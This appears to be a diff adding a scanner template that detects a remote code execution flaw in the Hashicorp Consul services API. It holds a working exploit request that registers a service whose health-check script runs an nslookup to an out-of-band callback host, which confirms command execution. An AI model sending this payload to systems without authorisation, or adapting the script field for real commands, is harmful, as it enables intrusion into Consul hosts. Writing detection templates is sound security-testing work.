@@ -1,0 +1,20 @@
+id: hashicorp-consul-rce
+info:
+  author: pikpikcu
+  name: Hashicorp Consul Services Api RCE
+  reference: https://www.exploit-db.com/exploits/46074
+  severity: critical
+  tags: hashicorp,rce,oob
+requests:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  raw:
+  - "PUT /v1/agent/service/register HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
+    \ (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nConnection: close\n\
+    Upgrade-Insecure-Requests: 1\nContent-Length: 205\n\n{\n  \"ID\": \"{{randstr}}\"\
+    ,\n  \"Name\": \"{{randstr}}\",\n  \"Address\": \"127.0.0.1\",\n  \"Port\": 80,\n\
+    \  \"check\": {\n    \"script\": \"nslookup {{interactsh-url}}\",\n    \"interval\"\
+    : \"10s\",\n    \"Timeout\": \"86400s\"\n  }\n}\n"
